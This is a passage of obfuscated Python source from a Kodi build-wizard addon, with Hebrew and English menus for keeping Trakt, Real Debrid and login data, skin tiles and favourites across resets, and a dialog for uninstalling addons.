	addFile ('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOO0OO00OO0OOO00O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3455
	addFile ('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0OOO0OOOOO000000 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3456
	addFile ('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0OOO0O0OO0000OO0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3457
def Menu ():#line:3458
	addDir ('אפשרויות נוספות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:3459
def saveMenu ():#line:3461
	OO0OOO00O0O0OOOO0 ='[COLOR yellow]מופעל[/COLOR]';O0O00OOO0O0O00OOO ='[COLOR blue]מבוטל[/COLOR]'#line:3463
	OO0O00O00O00OOO00 ='true'if KEEPMOVIEWALL =='true'else 'false'#line:3464
	OO0000OOOOOOOO0OO ='true'if KEEPMOVIELIST =='true'else 'false'#line:3465
	OOOOO0OOOOO0O000O ='true'if KEEPINFO =='true'else 'false'#line:3466
	O0OOO000OOO00O0O0 ='true'if KEEPSOUND =='true'else 'false'#line:3468
	O00O00O0OO00OO00O ='true'if KEEPVIEW =='true'else 'false'#line:3469
	OO000000O00OOO000 ='true'if KEEPSKIN =='true'else 'false'#line:3470
	O0OO00O0OO000O0OO ='true'if KEEPSKIN2 =='true'else 'false'#line:3471
	OOOOO0O000O0OO0O0 ='true'if KEEPSKIN3 =='true'else 'false'#line:3472
	OOO0O000O0OOOO00O ='true'if KEEPADDONS =='true'else 'false'#line:3473
	OOO0OOOO0O0OOOO00 ='true'if KEEPPVR =='true'else 'false'#line:3474
	O00O0000OO00OO0OO ='true'if KEEPTVLIST =='true'else 'false'#line:3475
	O000OOOOOOO000O0O ='true'if KEEPHUBMOVIE =='true'else 'false'#line:3476
	OOO0O0OO00000O00O ='true'if KEEPHUBTVSHOW =='true'else 'false'#line:3477
	O0O0OOOO00OOO0O0O ='true'if KEEPHUBTV =='true'else 'false'#line:3478
	OOO0O0000000OOOOO ='true'if KEEPHUBVOD =='true'else 'false'#line:3479
	O0O0000OOOO00O000 ='true'if KEEPHUBSPORT =='true'else 'false'#line:3480
	OOO0OOO000O00OO00 ='true'if KEEPHUBKIDS =='true'else 'false'#line:3481
	O0O000O00O0O00O00 ='true'if KEEPHUBMUSIC =='true'else 'false'#line:3482
	OO0O0O000O000O000 ='true'if KEEPHUBMENU =='true'else 'false'#line:3483
	OO0O0000OOOOO0000 ='true'if KEEPPLAYLIST =='true'else 'false'#line:3484
	O000O00000OO0OO00 ='true'if KEEPTRAKT =='true'else 'false'#line:3485
	O0OO00OOOOO00OOOO ='true'if KEEPREAL =='true'else 'false'#line:3486
	O000OOOOO000O0OOO ='true'if KEEPRD2 =='true'else 'false'#line:3487
	OOO00OO0000O00O00 ='true'if KEEPTORNET =='true'else 'true'#line:3488
	OOO0OO00OOO0O000O ='true'if KEEPLOGIN =='true'else 'false'#line:3489
	O0O0000OOO0OO0000 ='true'if KEEPSOURCES =='true'else 'false'#line:3490
	OO00OOOOO000O0O00 ='true'if KEEPADVANCED =='true'else 'false'#line:3491
	O000OO000O0OO00OO ='true'if KEEPPROFILES =='true'else 'false'#line:3492
	OOO0OO00O0OO00000 ='true'if KEEPFAVS =='true'else 'false'#line:3493
	OOO000O0OOO0000OO ='true'if KEEPREPOS =='true'else 'false'#line:3494
	O0000OO00O00O0000 ='true'if KEEPSUPER =='true'else 'false'#line:3495
	OOO0OOO0O00OOO000 ='true'if KEEPWHITELIST =='true'else 'false'#line:3496
	O0O00OOO000O00OO0 ='true'if KEEPWEATHER =='true'else 'false'#line:3497
	OO0O0OO0O0000OOO0 ='true'if KEEPVICTORY =='true'else 'false'#line:3498
	OOO0O0OO000O0O0OO ='true'if KEEPTELEMEDIA =='true'else 'false'#line:3499
	if OOO0OOO0O00OOO000 =='true':#line:3501
		addFile ('בחר הרחבות לשמירה','whitelist','edit',icon =ICONSAVE ,themeit =THEME1 )#line:3502
		addFile ('רשימת ההרחבות שבחרתי לשמור','whitelist','view',icon =ICONSAVE ,themeit =THEME1 )#line:3503
		addFile ('נקה רשימת הרחבות','whitelist','clear',icon =ICONSAVE ,themeit =THEME1 )#line:3504
		addFile ('יבה רשימת הרחבות','whitelist','import',icon =ICONSAVE ,themeit =THEME1 )#line:3505
		addFile ('יצא רשימת הרחבות','whitelist','export',icon =ICONSAVE ,themeit =THEME1 )#line:3506
	addFile ('%s שמירת חשבון RD:  '%O0OO00OOOOO00OOOO .replace ('true',OO0OOO00O0O0OOOO0 ).replace ('false',O0O00OOO0O0O00OOO ),'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME1 )#line:3509
	addFile ('%s שמירת חשבון טראקט:  '%O000O00000OO0OO00 .replace ('true',OO0OOO00O0O0OOOO0 ).replace ('false',O0O00OOO0O0O00OOO ),'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME1 )#line:3510
	addFile ('%s שמירת מועדפים:  '%OOO0OO00O0OO00000 .replace ('true',OO0OOO00O0O0OOOO0 ).replace ('false',O0O00OOO0O0O00OOO ),'togglesetting','keepfavourites',icon =ICONSAVE ,themeit =THEME1 )#line:3513
	addFile ('%s שמירת לקוח טלוויזיה:  '%OOO0OOOO0O0OOOO00 .replace ('true',OO0OOO00O0O0OOOO0 ).replace ('false',O0O00OOO0O0O00OOO ),'togglesetting','keeppvr',icon =ICONTRAKT ,themeit =THEME1 )#line:3514
	addFile ('%s שמירת הגדרות הרחבה ויקטורי:  '%OO0O0OO0O0000OOO0 .replace ('true',OO0OOO00O0O0OOOO0 ).replace ('false',O0O00OOO0O0O00OOO ),'togglesetting','keepvictory',icon =ICONTRAKT ,themeit =THEME1 )#line:3515
	addFile ('%s שמירת חשבון טלמדיה:  '%OOO0O0OO000O0O0OO .replace ('true',OO0OOO00O0O0OOOO0 ).replace ('false',O0O00OOO0O0O00OOO ),'togglesetting','keeptelemedia',icon =ICONTRAKT ,themeit =THEME1 )#line:3516
	addFile ('%s שמירת רשימת עורצי טלוויזיה:  '%O00O0000OO00OO0OO .replace ('true',OO0OOO00O0O0OOOO0 ).replace ('false',O0O00OOO0O0O00OOO ),'togglesetting','keeptvlist',icon =ICONTRAKT ,themeit =THEME1 )#line:3517
	addFile ('%s שמירת אריח סרטים:  '%O000OOOOOOO000O0O .replace ('true',OO0OOO00O0O0OOOO0 ).replace ('false',O0O00OOO0O0O00OOO ),'togglesetting','keephubmovie',icon =ICONTRAKT ,themeit =THEME1 )#line:3518
	addFile ('%s שמירת אריח סדרות:  '%OOO0O0OO00000O00O .replace ('true',OO0OOO00O0O0OOOO0 ).replace ('false',O0O00OOO0O0O00OOO ),'togglesetting','keephubtvshow',icon =ICONTRAKT ,themeit =THEME1 )#line:3519
	addFile ('%s שמירת אריח טלויזיה:  '%O0O0OOOO00OOO0O0O .replace ('true',OO0OOO00O0O0OOOO0 ).replace ('false',O0O00OOO0O0O00OOO ),'togglesetting','keephubtv',icon =ICONTRAKT ,themeit =THEME1 )#line:3520
	addFile ('%s שמירת אריח תוכן ישראלי:  '%OOO0O0000000OOOOO .replace ('true',OO0OOO00O0O0OOOO0 ).replace ('false',O0O00OOO0O0O00OOO ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3521
	addFile ('%s שמירת אריח ספורט:  '%O0O0000OOOO00O000 .replace ('true',OO0OOO00O0O0OOOO0 ).replace ('false',O0O00OOO0O0O00OOO ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3522
	addFile ('%s שמירת אריח ילדים:  '%OOO0OOO000O00OO00 .replace ('true',OO0OOO00O0O0OOOO0 ).replace ('false',O0O00OOO0O0O00OOO ),'togglesetting','keephubkids',icon =ICONTRAKT ,themeit =THEME1 )#line:3523
	addFile ('%s שמירת אריח מוסיקה:  '%O0O000O00O0O00O00 .replace ('true',OO0OOO00O0O0OOOO0 ).replace ('false',O0O00OOO0O0O00OOO ),'togglesetting','keephubmusic',icon =ICONTRAKT ,themeit =THEME1 )#line:3524
	addFile ('%s שמירת תפריט אריחים ראשי:  '%OO0O0O000O000O000 .replace ('true',OO0OOO00O0O0OOOO0 ).replace ('false',O0O00OOO0O0O00OOO ),'togglesetting','keephubmenu',icon =ICONTRAKT ,themeit =THEME1 )#line:3525
	addFile ('%s שמירת כל האריחים בסקין:  '%OO000000O00OOO000 .replace ('true',OO0OOO00O0O0OOOO0 ).replace ('false',O0O00OOO0O0O00OOO ),'togglesetting','keepskin',icon =ICONTRAKT ,themeit =THEME1 )#line:3526
	addFile ('%s שמירת הגדרות מזג האוויר:  '%O0O00OOO000O00OO0 .replace ('true',OO0OOO00O0O0OOOO0 ).replace ('false',O0O00OOO0O0O00OOO ),'togglesetting','keepweather',icon =ICONTRAKT ,themeit =THEME1 )#line:3527
	addFile ('%s שמירת הרחבות שהתקנתי:  '%OOO0O000O0OOOO00O .replace ('true',OO0OOO00O0O0OOOO0 ).replace ('false',O0O00OOO0O0O00OOO ),'togglesetting','keepaddons',icon =ICONTRAKT ,themeit =THEME1 )#line:3533
	addFile ('%s שמירת חשבון סדרות Tv ו Apollo Group:  '%OOOOO0OOOOO0O000O .replace ('true',OO0OOO00O0O0OOOO0 ).replace ('false',O0O00OOO0O0O00OOO ),'togglesetting','keepinfo',icon =ICONTRAKT ,themeit =THEME1 )#line:3534
	addFile ('%s שמירת ספריית סרטים וסדרות:  '%OO0000OOOOOOOO0OO .replace ('true',OO0OOO00O0O0OOOO0 ).replace ('false',O0O00OOO0O0O00OOO ),'togglesetting','keepmovielist',icon =ICONTRAKT ,themeit =THEME1 )#line:3537
	addFile ('%s שמירת נתיבי ספריות וידאו:  '%O0O0000OOO0OO0000 .replace ('true',OO0OOO00O0O0OOOO0 ).replace ('false',O0O00OOO0O0O00OOO ),'togglesetting','keepsources',icon =ICONSAVE ,themeit =THEME1 )#line:3538
	addFile ('%s שמירת הגדרות סאונד ורזולוציה:  '%O0OOO000OOO00O0O0 .replace ('true',OO0OOO00O0O0OOOO0 ).replace ('false',O0O00OOO0O0O00OOO ),'togglesetting','keepsound',icon =ICONTRAKT ,themeit =THEME1 )#line:3539
	addFile ('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה  : '%O00O00O0OO00OO00O .replace ('true',OO0OOO00O0O0OOOO0 ).replace ('false',O0O00OOO0O0O00OOO ),'togglesetting','keepview',icon =ICONTRAKT ,themeit =THEME1 )#line:3541
	addFile ('%s שמירת פליליסט לאודר:  '%OO0O0000OOOOO0000 .replace ('true',OO0OOO00O0O0OOOO0 ).replace ('false',O0O00OOO0O0O00OOO ),'togglesetting','keepplaylist',icon =ICONTRAKT ,themeit =THEME1 )#line:3542
	addFile ('%s שמירת הגדרות באפר: '%OO00OOOOO000O0O00 .replace ('true',OO0OOO00O0O0OOOO0 ).replace ('false',O0O00OOO0O0O00OOO ),'togglesetting','keepadvanced',icon =ICONSAVE ,themeit =THEME1 )#line:3547
	addFile ('%s שמירת רשימות ריפו:  '%OOO000O0OOO0000OO .replace ('true',OO0OOO00O0O0OOOO0 ).replace ('false',O0O00OOO0O0O00OOO ),'togglesetting','keeprepos',icon =ICONSAVE ,themeit =THEME1 )#line:3549
	setView ('files','viewType')#line:3551
def traktMenu ():#line:3553
	OO0O00OO000OO0OO0 ='[COLOR green]מופעל[/COLOR]'if KEEPTRAKT =='true'else '[COLOR red]מבוטל[/COLOR]'#line:3554
	O0O000OO000OO000O =str (TRAKTSAVE )if not TRAKTSAVE ==''else 'Trakt hasnt been saved yet.'#line:3555
	addFile ('[I]Register FREE Account at http://trakt.tv[/I]','',icon =ICONTRAKT ,themeit =THEME3 )#line:3556
	addFile ('Save Trakt Data: %s'%OO0O00OO000OO0OO0 ,'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME3 )#line:3557
	if KEEPTRAKT =='true':addFile ('Last Save: %s'%str (O0O000OO000OO000O ),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3558
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3559
	for OO0O00OO000OO0OO0 in traktit .ORDER :#line:3561
		OO000O0O0O00O0O0O =TRAKTID [OO0O00OO000OO0OO0 ]['name']#line:3562
		O0OOO000OO00OO0O0 =TRAKTID [OO0O00OO000OO0OO0 ]['path']#line:3563
		O0O000000OO0000OO =TRAKTID [OO0O00OO000OO0OO0 ]['saved']#line:3564
		OO00OOOOO000O000O =TRAKTID [OO0O00OO000OO0OO0 ]['file']#line:3565
		O0O000OOOOO000000 =wiz .getS (O0O000000OO0000OO )#line:3566
		O0OOOO00OOOOO0O00 =traktit .traktUser (OO0O00OO000OO0OO0 )#line:3567
		OOOO00OO00OO000O0 =TRAKTID [OO0O00OO000OO0OO0 ]['icon']if os .path .exists (O0OOO000OO00OO0O0 )else ICONTRAKT #line:3568
		OO0OO00OOO0O0OO0O =TRAKTID [OO0O00OO000OO0OO0 ]['fanart']if os .path .exists (O0OOO000OO00OO0O0 )else FANART #line:3569
		OOOOOO0OO0000OOOO =createMenu ('saveaddon','Trakt',OO0O00OO000OO0OO0 )#line:3570
		OOO0O0OOO0OOOOO0O =createMenu ('save','Trakt',OO0O00OO000OO0OO0 )#line:3571
		OOOOOO0OO0000OOOO .append ((THEME2 %'%s Settings'%OO000O0O0O00O0O0O ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)'%(ADDON_ID ,OO0O00OO000OO0OO0 )))#line:3572
		addFile ('[+]-> %s'%OO000O0O0O00O0O0O ,'',icon =OOOO00OO00OO000O0 ,fanart =OO0OO00OOO0O0OO0O ,themeit =THEME3 )#line:3574
		if not os .path .exists (O0OOO000OO00OO0O0 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OOOO00OO00OO000O0 ,fanart =OO0OO00OOO0O0OO0O ,menu =OOOOOO0OO0000OOOO )#line:3575
		elif not O0OOOO00OOOOO0O00 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt',OO0O00OO000OO0OO0 ,icon =OOOO00OO00OO000O0 ,fanart =OO0OO00OOO0O0OO0O ,menu =OOOOOO0OO0000OOOO )#line:3576
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O0OOOO00OOOOO0O00 ,'authtrakt',OO0O00OO000OO0OO0 ,icon =OOOO00OO00OO000O0 ,fanart =OO0OO00OOO0O0OO0O ,menu =OOOOOO0OO0000OOOO )#line:3577
		if O0O000OOOOO000000 =="":#line:3578
			if os .path .exists (OO00OOOOO000O000O ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt',OO0O00OO000OO0OO0 ,icon =OOOO00OO00OO000O0 ,fanart =OO0OO00OOO0O0OO0O ,menu =OOO0O0OOO0OOOOO0O )#line:3579
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt',OO0O00OO000OO0OO0 ,icon =OOOO00OO00OO000O0 ,fanart =OO0OO00OOO0O0OO0O ,menu =OOO0O0OOO0OOOOO0O )#line:3580
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0O000OOOOO000000 ,'',icon =OOOO00OO00OO000O0 ,fanart =OO0OO00OOO0O0OO0O ,menu =OOO0O0OOO0OOOOO0O )#line:3581
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3583
	addFile ('Save All Trakt Data','savetrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3584
	addFile ('Recover All Saved Trakt Data','restoretrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3585
	addFile ('Import Trakt Data','importtrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3586
	addFile ('Clear All Saved Trakt Data','cleartrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3587
	addFile ('Clear All Addon Data','addontrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3588
	setView ('files','viewType')#line:3589
def realMenu ():#line:3591
	O0O00OO0000OO0O0O ='[COLOR green]ON[/COLOR]'if KEEPREAL =='true'else '[COLOR red]OFF[/COLOR]'#line:3592
	O0O00OOOOO0000OO0 =str (REALSAVE )if not REALSAVE ==''else 'Real Debrid hasnt been saved yet.'#line:3593
	addFile ('[I]http://real-debrid.com is a PAID service.[/I]','',icon =ICONREAL ,themeit =THEME3 )#line:3594
	addFile ('Save Real Debrid Data: %s'%O0O00OO0000OO0O0O ,'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME3 )#line:3595
	if KEEPREAL =='true':addFile ('Last Save: %s'%str (O0O00OOOOO0000OO0 ),'',icon =ICONREAL ,themeit =THEME3 )#line:3596
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONREAL ,themeit =THEME3 )#line:3597
	for OO0O000000OO000OO in debridit .ORDER :#line:3599
		OO0OOO00OO0O0OO00 =DEBRIDID [OO0O000000OO000OO ]['name']#line:3600
		OOOOO00000OOOO0OO =DEBRIDID [OO0O000000OO000OO ]['path']#line:3601
		O0O0OOOOO00O0OOO0 =DEBRIDID [OO0O000000OO000OO ]['saved']#line:3602
		O000000OOO0O00O00 =DEBRIDID [OO0O000000OO000OO ]['file']#line:3603
		OO0O0OOOOOOOOO0OO =wiz .getS (O0O0OOOOO00O0OOO0 )#line:3604
		OO0O00O000000O000 =debridit .debridUser (OO0O000000OO000OO )#line:3605
		OOO0O0O0O0O00OO00 =DEBRIDID [OO0O000000OO000OO ]['icon']if os .path .exists (OOOOO00000OOOO0OO )else ICONREAL #line:3606
		OO00O00O00O0O0000 =DEBRIDID [OO0O000000OO000OO ]['fanart']if os .path .exists (OOOOO00000OOOO0OO )else FANART #line:3607
		OOOO00OOO0O0O0OO0 =createMenu ('saveaddon','Debrid',OO0O000000OO000OO )#line:3608
		OO0OO000OO00OOO00 =createMenu ('save','Debrid',OO0O000000OO000OO )#line:3609
		OOOO00OOO0O0O0OO0 .append ((THEME2 %'%s Settings'%OO0OOO00OO0O0OO00 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)'%(ADDON_ID ,OO0O000000OO000OO )))#line:3610
		addFile ('[+]-> %s'%OO0OOO00OO0O0OO00 ,'',icon =OOO0O0O0O0O00OO00 ,fanart =OO00O00O00O0O0000 ,themeit =THEME3 )#line:3612
		if not os .path .exists (OOOOO00000OOOO0OO ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OOO0O0O0O0O00OO00 ,fanart =OO00O00O00O0O0000 ,menu =OOOO00OOO0O0O0OO0 )#line:3613
		elif not OO0O00O000000O000 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid',OO0O000000OO000OO ,icon =OOO0O0O0O0O00OO00 ,fanart =OO00O00O00O0O0000 ,menu =OOOO00OOO0O0O0OO0 )#line:3614
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OO0O00O000000O000 ,'authdebrid',OO0O000000OO000OO ,icon =OOO0O0O0O0O00OO00 ,fanart =OO00O00O00O0O0000 ,menu =OOOO00OOO0O0O0OO0 )#line:3615
		if OO0O0OOOOOOOOO0OO =="":#line:3616
			if os .path .exists (O000000OOO0O00O00 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid',OO0O000000OO000OO ,icon =OOO0O0O0O0O00OO00 ,fanart =OO00O00O00O0O0000 ,menu =OO0OO000OO00OOO00 )#line:3617
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid',OO0O000000OO000OO ,icon =OOO0O0O0O0O00OO00 ,fanart =OO00O00O00O0O0000 ,menu =OO0OO000OO00OOO00 )#line:3618
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OO0O0OOOOOOOOO0OO ,'',icon =OOO0O0O0O0O00OO00 ,fanart =OO00O00O00O0O0000 ,menu =OO0OO000OO00OOO00 )#line:3619
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3621
	addFile ('Save All Real Debrid Data','savedebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3622
	addFile ('Recover All Saved Real Debrid Data','restoredebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3623
	addFile ('Import Real Debrid Data','importdebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3624
	addFile ('Clear All Saved Real Debrid Data','cleardebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3625
	addFile ('Clear All Addon Data','addondebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3626
	setView ('files','viewType')#line:3627
def loginMenu ():#line:3629
	OO00O00O0OOOOO00O ='[COLOR green]ON[/COLOR]'if KEEPLOGIN =='true'else '[COLOR red]OFF[/COLOR]'#line:3630
	O00O000O0O00O0000 =str (LOGINSAVE )if not LOGINSAVE ==''else 'Login data hasnt been saved yet.'#line:3631
	addFile ('[I]Several of these addons are PAID services.[/I]','',icon =ICONLOGIN ,themeit =THEME3 )#line:3632
	addFile ('Save Login Data: %s'%OO00O00O0OOOOO00O ,'togglesetting','keeplogin',icon =ICONLOGIN ,themeit =THEME3 )#line:3633
	if KEEPLOGIN =='true':addFile ('Last Save: %s'%str (O00O000O0O00O0000 ),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3634
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3635
	for OO00O00O0OOOOO00O in loginit .ORDER :#line:3637
		OO000000000O0O0O0 =LOGINID [OO00O00O0OOOOO00O ]['name']#line:3638
		O0OO000O000O0OO00 =LOGINID [OO00O00O0OOOOO00O ]['path']#line:3639
		OOO00O0OOOOO00O0O =LOGINID [OO00O00O0OOOOO00O ]['saved']#line:3640
		O000OOOO0OO00O000 =LOGINID [OO00O00O0OOOOO00O ]['file']#line:3641
		OOO0000OO0OO0O0O0 =wiz .getS (OOO00O0OOOOO00O0O )#line:3642
		O0O0O000OO0OO0OO0 =loginit .loginUser (OO00O00O0OOOOO00O )#line:3643
		OOOO000OO00O0000O =LOGINID [OO00O00O0OOOOO00O ]['icon']if os .path .exists (O0OO000O000O0OO00 )else ICONLOGIN #line:3644
		O00OO00OO0O0O0OOO =LOGINID [OO00O00O0OOOOO00O ]['fanart']if os .path .exists (O0OO000O000O0OO00 )else FANART #line:3645
		O0OO00OO00OO00OOO =createMenu ('saveaddon','Login',OO00O00O0OOOOO00O )#line:3646
		OO0OO00OO00OOOOO0 =createMenu ('save','Login',OO00O00O0OOOOO00O )#line:3647
		O0OO00OO00OO00OOO .append ((THEME2 %'%s Settings'%OO000000000O0O0O0 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)'%(ADDON_ID ,OO00O00O0OOOOO00O )))#line:3648
		addFile ('[+]-> %s'%OO000000000O0O0O0 ,'',icon =OOOO000OO00O0000O ,fanart =O00OO00OO0O0O0OOO ,themeit =THEME3 )#line:3650
		if not os .path .exists (O0OO000O000O0OO00 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OOOO000OO00O0000O ,fanart =O00OO00OO0O0O0OOO ,menu =O0OO00OO00OO00OOO )#line:3651
		elif not O0O0O000OO0OO0OO0 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin',OO00O00O0OOOOO00O ,icon =OOOO000OO00O0000O ,fanart =O00OO00OO0O0O0OOO ,menu =O0OO00OO00OO00OOO )#line:3652
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O0O0O000OO0OO0OO0 ,'authlogin',OO00O00O0OOOOO00O ,icon =OOOO000OO00O0000O ,fanart =O00OO00OO0O0O0OOO ,menu =O0OO00OO00OO00OOO )#line:3653
		if OOO0000OO0OO0O0O0 =="":#line:3654
			if os .path .exists (O000OOOO0OO00O000 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin',OO00O00O0OOOOO00O ,icon =OOOO000OO00O0000O ,fanart =O00OO00OO0O0O0OOO ,menu =OO0OO00OO00OOOOO0 )#line:3655
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin',OO00O00O0OOOOO00O ,icon =OOOO000OO00O0000O ,fanart =O00OO00OO0O0O0OOO ,menu =OO0OO00OO00OOOOO0 )#line:3656
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OOO0000OO0OO0O0O0 ,'',icon =OOOO000OO00O0000O ,fanart =O00OO00OO0O0O0OOO ,menu =OO0OO00OO00OOOOO0 )#line:3657
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3659
	addFile ('Save All Login Data','savelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3660
	addFile ('Recover All Saved Login Data','restorelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3661
	addFile ('Import Login Data','importlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3662
	addFile ('Clear All Saved Login Data','clearlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3663
	addFile ('Clear All Addon Data','addonlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3664
	setView ('files','viewType')#line:3665
def fixUpdate ():#line:3667
	if KODIV <17 :#line:3668
		OO0OO000000OO0OOO =os .path .join (DATABASE ,wiz .latestDB ('Addons'))#line:3669
		try :#line:3670
			os .remove (OO0OO000000OO0OOO )#line:3671
		except Exception as OO0O0OO0OOO0OOO0O :#line:3672
			wiz .log ("Unable to remove %s, Purging DB"%OO0OO000000OO0OOO )#line:3673
			wiz .purgeDb (OO0OO000000OO0OOO )#line:3674
	else :#line:3675
		xbmc .log ("Requested Addons.db be removed but doesnt work in Kod17")#line:3676
def removeAddonMenu ():#line:3678
	OOOOOOO0OO0OO0OOO =glob .glob (os .path .join (ADDONS ,'*/'))#line:3679
	O0O00000OO0OOOO00 =[];OO0OO00000O0000O0 =[]#line:3680
	for OO0OOOO0OOOOOO0OO in sorted (OOOOOOO0OO0OO0OOO ,key =lambda O0OOOO0OOO00O0O00 :O0OOOO0OOO00O0O00 ):#line:3681
		O0OO000O00O0O000O =os .path .split (OO0OOOO0OOOOOO0OO [:-1 ])[1 ]#line:3682
		if O0OO000O00O0O000O in EXCLUDES :continue #line:3683
		elif O0OO000O00O0O000O in DEFAULTPLUGINS :continue #line:3684
		elif O0OO000O00O0O000O =='packages':continue #line:3685
		OO0OOO0OO0O000OOO =os .path .join (OO0OOOO0OOOOOO0OO ,'addon.xml')#line:3686
		if os .path .exists (OO0OOO0OO0O000OOO ):#line:3687
			O000OOO00O0O0OO00 =open (OO0OOO0OO0O000OOO )#line:3688
			O0O0O0OOOOOOOO000 =O000OOO00O0O0OO00 .read ()#line:3689
			OO00OO0OOOO0OOOO0 =wiz .parseDOM (O0O0O0OOOOOOOO000 ,'addon',ret ='id')#line:3690
			O0OOO000OOO00O0OO =O0OO000O00O0O000O if len (OO00OO0OOOO0OOOO0 )==0 else OO00OO0OOOO0OOOO0 [0 ]#line:3692
			try :#line:3693
				O00OOO000O0OOO000 =xbmcaddon .Addon (id =O0OOO000OOO00O0OO )#line:3694
				O0O00000OO0OOOO00 .append (O00OOO000O0OOO000 .getAddonInfo ('name'))#line:3695
				OO0OO00000O0000O0 .append (O0OOO000OOO00O0OO )#line:3696
			except :#line:3697
				pass #line:3698
	if len (O0O00000OO0OOOO00 )==0 :#line:3699
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Addons To Remove[/COLOR]"%COLOR2 )#line:3700
		return #line:3701
	if KODIV >16 :#line:3702
		OO00000000O00OOOO =DIALOG .multiselect ("%s: Select the addons you wish to remove."%ADDONTITLE ,O0O00000OO0OOOO00 )#line:3703
	else :#line:3704
		OO00000000O00OOOO =[];O0O000000O00000OO =0 #line:3705
		OO0OOO00OO0O0O00O =["-- Click here to Continue --"]+O0O00000OO0OOOO00 #line:3706
		while not O0O000000O00000OO ==-1 :#line:3707
			O0O000000O00000OO =DIALOG .select ("%s: Select the addons you wish to remove."%ADDONTITLE ,OO0OOO00OO0O0O00O )#line:3708
			if O0O000000O00000OO ==-1 :break #line:3709
			elif O0O000000O00000OO ==0 :break #line:3710
			else :#line:3711
				OOOO0OOO0OO0O0OOO =(O0O000000O00000OO -1 )#line:3712
				if OOOO0OOO0OO0O0OOO in OO00000000O00OOOO :#line:3713
					OO00000000O00OOOO .remove (OOOO0OOO0OO0O0OOO )#line:3714
					OO0OOO00OO0O0O00O [O0O000000O00000OO ]=O0O00000OO0OOOO00 [OOOO0OOO0OO0O0OOO ]#line:3715
				else :#line:3716
					OO00000000O00OOOO .append (OOOO0OOO0OO0O0OOO )#line:3717
					OO0OOO00OO0O0O00O [O0O000000O00000OO ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,O0O00000OO0OOOO00 [OOOO0OOO0OO0O0OOO ])#line:3718
	if OO00000000O00OOOO ==None :return #line:3719
	if len (OO00000000O00OOOO )>0 :#line:3720
		wiz .addonUpdates ('set')#line:3721
		for O0OOO00000O000OO0 in OO00000000O00OOOO :#line:3722
			removeAddon (OO0OO00000O0000O0 [O0OOO00000O000OO0 ],O0O00000OO0OOOO00 [O0OOO00000O000OO0 ],True )#line:3723
		xbmc .sleep (1000 )#line:3725
		if INSTALLMETHOD ==1 :O00O0000000OOOO0O =1 #line:3727
		elif INSTALLMETHOD ==2 :O00O0000000OOOO0O =0 #line:3728
